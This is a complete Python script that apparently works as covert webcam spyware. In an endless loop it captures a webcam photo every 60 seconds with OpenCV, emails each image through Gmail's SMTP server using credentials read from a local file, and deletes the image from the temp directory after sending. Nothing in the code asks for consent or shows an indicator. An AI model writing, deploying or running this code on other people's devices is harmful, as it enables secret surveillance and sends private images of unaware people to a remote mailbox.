#######################
# @author: RaffaDNDM
# @date:   2022-02-27
#######################

import smtplib #SMTP services
import os
import time
import tempfile
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import argparse
import cv2


def send_mail(email, password, img_name):
    '''
    Send e-mail with webcam shot attachment.

    Args:
        email (str): e-mail address

        password (str): Password of the e-mail address

        img_name (str): Name of the image to be sent
    '''

    #Create the mail
    msg = MIMEMultipart()
    msg['Subject'] = 'Webcam shot'
    msg['From'] = email
    msg['To'] = email

    #Creation time in text of mail
    text = MIMEText(time.ctime(os.path.getctime(img_name)))
    msg.attach(text)
    
    #Webcam shot reading and attachment in mail
    with open(img_name, 'rb') as f:
        image = MIMEImage(f.read(), name=os.path.basename(img_name))
        msg.attach(image)

    #Sending mail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg.as_string())
    server.quit()


def credentials():
    '''
    Read credentials of the user from the file.

    Returns:
        mail (str): e-mail address of the user

        password (str): password address of the user
    '''

    with open('credentials.txt', "r") as f:
        credentials = ((f.read()).split('\n'))[0].split(' ')

    mail = credentials[0]
    password = credentials[1]

    return mail, password


def webcam_shot():
    '''
    Take a screenshot.

    Returns:
        img_name (str): Name of the screenshot image
    '''

    #Take webcam shot
    camera = cv2.VideoCapture(0)
    return_value, image = camera.read()
    #Name of the shot (shot+current_time.png)
    img_name = 'shot'+str(time.localtime())+'.png'
    #Store the image
    cv2.imwrite(img_name, image)
    #Close webcam connection
    del(camera)

    return img_name


def args_parser():
    '''
    Parser of command line arguments
    '''

    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    
    #Initialization of needed arguments
    parser.add_argument("-refresh", "-t", dest="refresh_time", help="Refreshing time of log info")
    
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line

    return args.refresh_time


def main():
    refresh_time = args_parser()
    
    #A screenshot every 1min=60s
    if not refresh_time:
        refresh_time = '60'

    mail, password = credentials()
    os.chdir(tempfile.gettempdir())

    while(True):
        img_name = webcam_shot()
        send_mail(mail, password, img_name)
        os.remove(img_name)
        time.sleep(int(refresh_time))


if __name__=='__main__':
    main()
